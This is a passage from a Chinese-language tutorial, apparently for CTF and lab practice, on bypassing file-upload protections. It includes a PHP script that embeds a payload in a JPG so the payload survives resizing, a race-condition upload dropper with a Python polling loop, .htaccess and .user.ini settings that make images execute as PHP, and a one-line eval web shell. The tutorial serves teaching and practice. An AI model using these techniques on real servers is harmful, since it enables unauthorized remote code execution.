class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations caused by PHP functions imagecopyresized() and imagecopyresampled().</span></span><br><span class="line"><span class="comment">    It is necessary that the size and quality of the initial image are the same as those of the processed image.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    1) Upload an arbitrary image via secured files upload script</span></span><br><span class="line"><span class="comment">    2) Save the processed image and launch:</span></span><br><span class="line"><span class="comment">    jpg_payload.php &lt;jpg_name.jpg&gt;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    In case of successful injection you will get a specially crafted image, which should be uploaded again.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    Since the most straightforward injection method is used, the following problems can occur:</span></span><br><span class="line"><span class="comment">    1) After the second processing the injected data may become partially corrupted.</span></span><br><span class="line"><span class="comment">    2) The jpg_payload.php script outputs &quot;Something&#x27;s wrong&quot;.</span></span><br><span class="line"><span class="comment">    If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    Sergey Bobrov <span class="doctag">@Black</span>2Fan.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    See also:</span></span><br><span class="line"><span class="comment">    https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$miniPayload</span> = <span class="string">&quot;&lt;?=phpinfo();?&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!extension_loaded(<span class="string">&#x27;gd&#x27;</span>) || !function_exists(<span class="string">&#x27;imagecreatefromjpeg&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;php-gd is not installed&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$argv</span>[<span class="number">1</span>])) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;php jpg_payload.php &lt;jpg_name.jpg&gt;&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    set_error_handler(<span class="string">&quot;custom_error_handler&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$pad</span> = <span class="number">0</span>; <span class="variable">$pad</span> &lt; <span class="number">1024</span>; <span class="variable">$pad</span>++) &#123;</span><br><span class="line">        <span class="variable">$nullbytePayloadSize</span> = <span class="variable">$pad</span>;</span><br><span class="line">        <span class="variable">$dis</span> = <span class="keyword">new</span> DataInputStream(<span class="variable">$argv</span>[<span class="number">1</span>]);</span><br><span class="line">        <span class="variable">$outStream</span> = file_get_contents(<span class="variable">$argv</span>[<span class="number">1</span>]);</span><br><span class="line">        <span class="variable">$extraBytes</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="variable">$correctImage</span> = <span class="literal">TRUE</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$dis</span>-&gt;readShort() != <span class="number">0xFFD8</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;Incorrect SOI marker&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>((!<span class="variable">$dis</span>-&gt;eof()) &amp;&amp; (<span class="variable">$dis</span>-&gt;readByte() == <span class="number">0xFF</span>)) &#123;</span><br><span class="line">            <span class="variable">$marker</span> = <span class="variable">$dis</span>-&gt;readByte();</span><br><span class="line">            <span class="variable">$size</span> = <span class="variable">$dis</span>-&gt;readShort() - <span class="number">2</span>;</span><br><span class="line">            <span class="variable">$dis</span>-&gt;skip(<span class="variable">$size</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$marker</span> === <span class="number">0xDA</span>) &#123;</span><br><span class="line">                <span class="variable">$startPos</span> = <span class="variable">$dis</span>-&gt;seek();</span><br><span class="line">                <span class="variable">$outStreamTmp</span> = </span><br><span class="line">                    substr(<span class="variable">$outStream</span>, <span class="number">0</span>, <span class="variable">$startPos</span>) . </span><br><span class="line">                    <span class="variable">$miniPayload</span> . </span><br><span class="line">                    str_repeat(<span class="string">&quot;\0&quot;</span>,<span class="variable">$nullbytePayloadSize</span>) . </span><br><span class="line">                    substr(<span class="variable">$outStream</span>, <span class="variable">$startPos</span>);</span><br><span class="line">                checkImage(<span class="string">&#x27;_&#x27;</span>.<span class="variable">$argv</span>[<span class="number">1</span>], <span class="variable">$outStreamTmp</span>, <span class="literal">TRUE</span>);</span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$extraBytes</span> !== <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">while</span>((!<span class="variable">$dis</span>-&gt;eof())) &#123;</span><br><span class="line">                        <span class="keyword">if</span>(<span class="variable">$dis</span>-&gt;readByte() === <span class="number">0xFF</span>) &#123;</span><br><span class="line">                            <span class="keyword">if</span>(<span class="variable">$dis</span>-&gt;readByte !== <span class="number">0x00</span>) &#123;</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="variable">$stopPos</span> = <span class="variable">$dis</span>-&gt;seek() - <span class="number">2</span>;</span><br><span class="line">                    <span class="variable">$imageStreamSize</span> = <span class="variable">$stopPos</span> - <span class="variable">$startPos</span>;</span><br><span class="line">                    <span class="variable">$outStream</span> = </span><br><span class="line">                        substr(<span class="variable">$outStream</span>, <span class="number">0</span>, <span class="variable">$startPos</span>) . </span><br><span class="line">                        <span class="variable">$miniPayload</span> . </span><br><span class="line">                        substr(</span><br><span class="line">                            str_repeat(<span class="string">&quot;\0&quot;</span>,<span class="variable">$nullbytePayloadSize</span>).</span><br><span class="line">                                substr(<span class="variable">$outStream</span>, <span class="variable">$startPos</span>, <span class="variable">$imageStreamSize</span>),</span><br><span class="line">                            <span class="number">0</span>,</span><br><span class="line">                            <span class="variable">$nullbytePayloadSize</span>+<span class="variable">$imageStreamSize</span>-<span class="variable">$extraBytes</span>) . </span><br><span class="line">                                substr(<span class="variable">$outStream</span>, <span class="variable">$stopPos</span>);</span><br><span class="line">                &#125; <span class="keyword">elseif</span>(<span class="variable">$correctImage</span>) &#123;</span><br><span class="line">                    <span class="variable">$outStream</span> = <span class="variable">$outStreamTmp</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(checkImage(<span class="string">&#x27;payload_&#x27;</span>.<span class="variable">$argv</span>[<span class="number">1</span>], <span class="variable">$outStream</span>)) &#123;</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&#x27;Success!&#x27;</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    unlink(<span class="string">&#x27;payload_&#x27;</span>.<span class="variable">$argv</span>[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Something\&#x27;s wrong&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">checkImage</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$data</span>, <span class="variable">$unlink</span> = <span class="literal">FALSE</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$correctImage</span>;</span><br><span class="line">        file_put_contents(<span class="variable">$filename</span>, <span class="variable">$data</span>);</span><br><span class="line">        <span class="variable">$correctImage</span> = <span class="literal">TRUE</span>;</span><br><span class="line">        imagecreatefromjpeg(<span class="variable">$filename</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$unlink</span>)</span><br><span class="line">            unlink(<span class="variable">$filename</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$correctImage</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">custom_error_handler</span>(<span class="params"><span class="variable">$errno</span>, <span class="variable">$errstr</span>, <span class="variable">$errfile</span>, <span class="variable">$errline</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$extraBytes</span>, <span class="variable">$correctImage</span>;</span><br><span class="line">        <span class="variable">$correctImage</span> = <span class="literal">FALSE</span>;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/(\d+) extraneous bytes before marker/&#x27;</span>, <span class="variable">$errstr</span>, <span class="variable">$m</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$m</span>[<span class="number">1</span>])) &#123;</span><br><span class="line">                <span class="variable">$extraBytes</span> = (<span class="keyword">int</span>)<span class="variable">$m</span>[<span class="number">1</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">DataInputStream</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$binData</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$order</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$size</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$order</span> = <span class="literal">false</span>, <span class="variable">$fromString</span> = <span class="literal">false</span></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;binData = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;order = <span class="variable">$order</span>;</span><br><span class="line">            <span class="keyword">if</span>(!<span class="variable">$fromString</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span>(!file_exists(<span class="variable">$filename</span>) || !is_file(<span class="variable">$filename</span>))</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&#x27;File not exists [&#x27;</span>.<span class="variable">$filename</span>.<span class="string">&#x27;]&#x27;</span>);</span><br><span class="line">                <span class="keyword">$this</span>-&gt;binData = file_get_contents(<span class="variable">$filename</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;binData = <span class="variable">$filename</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;size = strlen(<span class="keyword">$this</span>-&gt;binData);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">seek</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> (<span class="keyword">$this</span>-&gt;size - strlen(<span class="keyword">$this</span>-&gt;binData));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">skip</span>(<span class="params"><span class="variable">$skip</span></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;binData = substr(<span class="keyword">$this</span>-&gt;binData, <span class="variable">$skip</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readByte</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;eof()) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;End Of File&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$byte</span> = substr(<span class="keyword">$this</span>-&gt;binData, <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;binData = substr(<span class="keyword">$this</span>-&gt;binData, <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">return</span> ord(<span class="variable">$byte</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readShort</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(strlen(<span class="keyword">$this</span>-&gt;binData) &lt; <span class="number">2</span>) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;End Of File&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$short</span> = substr(<span class="keyword">$this</span>-&gt;binData, <span class="number">0</span>, <span class="number">2</span>);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;binData = substr(<span class="keyword">$this</span>-&gt;binData, <span class="number">2</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;order) &#123;</span><br><span class="line">                <span class="variable">$short</span> = (ord(<span class="variable">$short</span>[<span class="number">1</span>]) &lt;&lt; <span class="number">8</span>) + ord(<span class="variable">$short</span>[<span class="number">0</span>]);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$short</span> = (ord(<span class="variable">$short</span>[<span class="number">0</span>]) &lt;&lt; <span class="number">8</span>) + ord(<span class="variable">$short</span>[<span class="number">1</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$short</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">eof</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> !<span class="keyword">$this</span>-&gt;binData||(strlen(<span class="keyword">$this</span>-&gt;binData) === <span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>先找一张jpg上传，将上传的图片进行下载，kali运行脚本</p>
<blockquote>
<p>php ben.php 21044.jpg</p>
</blockquote>
<p><img src="https://i.loli.net/2021/06/06/lgyOxavE5J9VbrW.png" alt="image-20210414193225272"></p>
<p>010打开查看</p>
<p><img src="C:\Users\yinanping\AppData\Roaming\Typora\typora-user-images\image-20210414193438953.png" alt="image-20210414193438953"></p>
<p>写入成功</p>
<h3 id="5-条件竞争"><a href="#5-条件竞争" class="headerlink" title="5.条件竞争"></a>5.条件竞争</h3><p>示例</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(move_uploaded_file(<span class="variable">$temp_file</span>, <span class="variable">$upload_file</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(in_array(<span class="variable">$file_ext</span>,<span class="variable">$ext_arr</span>))&#123;</span><br><span class="line">             <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span>. rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br><span class="line">             rename(<span class="variable">$upload_file</span>, <span class="variable">$img_path</span>);</span><br><span class="line">             <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;</span><br><span class="line">            unlink(<span class="variable">$upload_file</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>之前都是，首先判断 我们上传的文件 是否 符合白名单，或者是不在黑名单当中；只有当条件符合时，才会使用 <code>move_uploaded_file($temp_file, $upload_file)</code> 将我们上传的文件进行路径移动。</p>
<p>而本题时首先将我们上传的文件进行路径移动，然后再判断是否符合白名单，如果不符合的话，就会使用 <code>unlink($upload_file);</code> 将我们上传的文件进行 <code>删除</code> 。</p>
<p>因此如果我们想要上传 <code>.php</code> 文件的话，就需要 在 其服务器删除我们的文件之前进行访问利用。</p>
<p>方法：短时间内不断重复上传该文件，可使用 BurpSuite</p>
<h4 id="方法一：Burp-Suite-爆破"><a href="#方法一：Burp-Suite-爆破" class="headerlink" title="方法一：Burp Suite 爆破"></a>方法一：Burp Suite 爆破</h4><p>上传一个key.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> fputs(fopen(<span class="string">&quot;info.php&quot;</span>, <span class="string">&quot;w&quot;</span>), <span class="string">&#x27;&lt;?php phpinfo();?&gt;&#x27;</span>); <span class="meta">?&gt;</span> <span class="comment">//此代码的作用是只要 一访问到key.php，此脚本就被解析 进而生成info.php文件，内容为 <span class="meta">&lt;?php</span> phpinfo();<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/06/06/KQX49bE83T5svuC.png" alt="image-20210414194605250"></p>
<p>进行无限次的 上传 key.php 和无限次的访问 key.php</p>
<p>直到访问的状态码为200即上传 info.php成功</p>
<h4 id="方法二：访问部分可使用-python脚本"><a href="#方法二：访问部分可使用-python脚本" class="headerlink" title="方法二：访问部分可使用 python脚本"></a>方法二：访问部分可使用 python脚本</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests </span><br><span class="line">url = <span class="string">&quot;http://127.0.0.1:8090/upload/key.php&quot;</span> </span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>: </span><br><span class="line">    html = requests.get(url) </span><br><span class="line">    <span class="keyword">if</span> html.status_code == <span class="number">200</span>: <span class="built_in">print</span>(<span class="string">&quot;OK&quot;</span>) </span><br><span class="line">        <span class="keyword">break</span> </span><br><span class="line">    <span class="keyword">else</span>:<span class="built_in">print</span>(<span class="string">&quot;NO&quot;</span>)</span><br></pre></td></tr></table></figure>

<h1 id="三、-htaccess-攻击"><a href="#三、-htaccess-攻击" class="headerlink" title="三、.htaccess 攻击"></a>三、.htaccess 攻击</h1><blockquote>
<p><strong>httpd-conf</strong> 是APache <strong>系统的配置文件（全局的）</strong>；</p>
<p><strong>.htaccess</strong> 文件是 Apache <strong>服务器的分布式配置文件（局部的）</strong>，该配置文件会覆盖Apache服务器的全局配置，只对 <strong>该文件所在目录下的文件起作用</strong>。<br>如果一个Web应用程序允许上传.htaccess文件，则说明攻击者可以更改Apache的配置。</p>
</blockquote>
<ul>
<li><p><strong>缺点</strong>：只在 <code>Apache 服务器</code> 下起作用</p>
</li>
<li><p><strong>使用条件：</strong></p>
</li>
</ul>
<p>Apache目录下：/conf/httpd.conf 中 <code>AllowOverride</code> 为 <code>All</code> 则意味着.htaccess 文件可更改 Apache 配置<br><img src="https://i.loli.net/2021/06/06/xcDiO5rdkplgwCZ.png" alt="20210211121910536"></p>
<h2 id="3-1-利用一：将-png-文件当作-PHP文件处理"><a href="#3-1-利用一：将-png-文件当作-PHP文件处理" class="headerlink" title="3.1 利用一：将.png 文件当作 PHP文件处理"></a>3.1 利用一：将.png 文件当作 PHP文件处理</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">将所有.png格式的图片都当作.php处理：phpinfo.png</span><br><span class="line">在 .htaccess 文件中写入：</span><br><span class="line">AddType application/x-httpd-php .png </span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2021/06/06/CWcPAyVXHQOdsBq.png" alt="在这里插入图片描述"></p>
<p><img src="https://i.loli.net/2021/06/06/XrO9nAwRfjtH1lz.png" alt="在这里插入图片描述"></p>
<p><img src="https://i.loli.net/2021/06/06/QCVYdEzUcjI6bFf.png" alt="20210211124119106"></p>
<h2 id="3-2-利用二：文件中包含-php-关键字"><a href="#3-2-利用二：文件中包含-php-关键字" class="headerlink" title="3.2 利用二：文件中包含 php 关键字"></a>3.2 利用二：文件中包含 php 关键字</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">文件名中只要包含 .php 关键字就当作php处理：phpinfo.php.png</span><br><span class="line">在 .htaccess 文件中写入：</span><br><span class="line">AddHandler php5<span class="operator">-</span>script php </span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2021/06/06/pXZrE6JPm8WGdYL.png" alt="20210211124119106"></p>
<p><img src="https://i.loli.net/2021/06/06/4Y59p7Ga2inoFr3.png" alt="20210211124848875"></p>
<p><img src="D:\images\20210211125111782.png" alt="20210211125111782"></p>
<h2 id="3-3-利用三：匹配文件名"><a href="#3-3-利用三：匹配文件名" class="headerlink" title="3.3 利用三：匹配文件名"></a>3.3 利用三：匹配文件名</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">匹配文件名：文件名</span><br><span class="line"><span class="operator">&lt;</span>FilesMatch &quot;文件名&quot;<span class="operator">&gt;</span></span><br><span class="line">SetHandler application<span class="operator">/</span>x<span class="operator">-</span>httpd<span class="operator">-</span>php</span><br><span class="line"><span class="operator">&lt;</span><span class="operator">/</span>FilesMatch<span class="operator">&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2021/06/06/PTml1WOKonfN6AM.png" alt="在这里插入图片描述"></p>
<p><img src="https://i.loli.net/2021/06/06/LoMvPX1JVKiSQpG.png" alt="在这里插入图片描述"></p>
<p><img src="https://i.loli.net/2021/06/06/HtTUl9YxvQwIghs.png" alt="20210211125342878"></p>
<h2 id="3-4-利用四：将所有文件后缀都当作php文件处理"><a href="#3-4-利用四：将所有文件后缀都当作php文件处理" class="headerlink" title="3.4 利用四：将所有文件后缀都当作php文件处理"></a>3.4 利用四：将所有文件后缀都当作php文件处理</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.htaccess 文件当中写入：</span><br><span class="line">	SetHandler application/x-httpd-php </span><br><span class="line">phpinfo1.gif</span><br><span class="line">    写入：&lt;?<span class="function">php <span class="title">phpinfo</span><span class="params">()</span></span>; ?&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/06/06/Fi2MDBhAvXSGP7n.png" alt="image-20210323161559814"></p>
<h1 id="四、-user-ini"><a href="#四、-user-ini" class="headerlink" title="四、.user.ini"></a>四、.user.ini</h1><blockquote>
<p><strong>php.ini</strong> 是 PHP 的一个 全局配置文件（全局的）；</p>
<p><strong>.user.ini</strong> 是 PHP的目录配置文件（局部的），相当于用户自己定义的一个 <strong>php.ini</strong> 文件。</p>
</blockquote>
<p>PHP中的每个配置都有其所处的模式。其中允许使用 <code>.user.ini</code> 能够更改的模式有 <code>PHP_INI_PERDIR 和 PHP_INI_USER </code>等等。</p>
<p>而 <code>PHP_INI_PERDIR</code> 这个模式当中的 <strong>auto_append_file 和 auto_prepend_file</strong> 这两个配置对我们有很大帮助。</p>
<blockquote>
<p>**auto_append_file ** ：指定一个文件在主文件解析之前解析；</p>
<p><strong>auto_prepend_file</strong>：指定一个文件在主文件之后解析。</p>
</blockquote>
<ul>
<li><p><strong>原理：</strong>我们可以使用 auto_prepend_file 这个选项，将我们所要上传的图片马在该目录下的其它PHP文件执行之前首先 <code>包含</code> 我们所上传的图片马。相当于在原有的 PHP文件的代码开头加上了 <code>require(&#39;a.jpg&#39;)</code> ，从而进行了 <code>文件包含</code>，这样我们的图片马就得到了利用。</p>
</li>
<li><p><strong>优点</strong>：不仅仅限于 Apache 服务器，还可以用于 Nginx , IIS 等服务器。</p>
</li>
<li><p><strong>使用条件</strong>：</p>
<ul>
<li>上传的 .user.ini 目录下必须含有 .php 文件，而一般的题目当中不会含有。</li>
<li>服务器使用CGI／FastCGI模式</li>
</ul>
</li>
<li><p><strong>利用</strong>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.user.ini 文件：</span><br><span class="line">GIF89a                  </span><br><span class="line">auto_prepend_file=a.jpg </span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a.jpg :</span><br><span class="line">GIF89a</span><br><span class="line">&lt;script language=<span class="string">&#x27;php&#x27;</span>&gt; @eval($_POST[<span class="string">&#x27;pass&#x27;</span>]);&lt;/script&gt;</span><br></pre></td></tr></table></figure></li>
</ul>
<h1 id="五、Web容器解析漏洞"><a href="#五、Web容器解析漏洞" class="headerlink" title="五、Web容器解析漏洞"></a>五、Web容器解析漏洞</h1><h2 id="5-1-Apache-解析漏洞"><a href="#5-1-Apache-解析漏洞" class="headerlink" title="5.1 Apache 解析漏洞"></a>5.1 Apache 解析漏洞</h2><h3 id="5-1-1-多后缀文件解析漏洞"><a href="#5-1-1-多后缀文件解析漏洞" class="headerlink" title="5.1.1 多后缀文件解析漏洞"></a>5.1.1 多后缀文件解析漏洞</h3><p>Apache当中，多后缀文件将会从最右边的后缀开始识别，如果后缀不在对应的 MIME type 或者是 Hander，就会继续向左识别，直到后缀有对应的MIME type 或 Hander。</p>
<p><strong>利用：</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">phpinfo.php.xxx.xx.x</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/06/06/JITQ1S2AxD7jtnC.png" alt="image-20210327131529195"></p>
<p><strong>注：该漏洞比较古老，大部分已经修复过了，但是会出现在CTF中</strong></p>
<h3 id="5-1-2-CVE-2017-15715-漏洞"><a href="#5-1-2-CVE-2017-15715-漏洞" class="headerlink" title="5.1.2 CVE-2017-15715 漏洞"></a>5.1.2 CVE-2017-15715 漏洞</h3><p>适用版本：2.4.0-2.4.29版本</p>
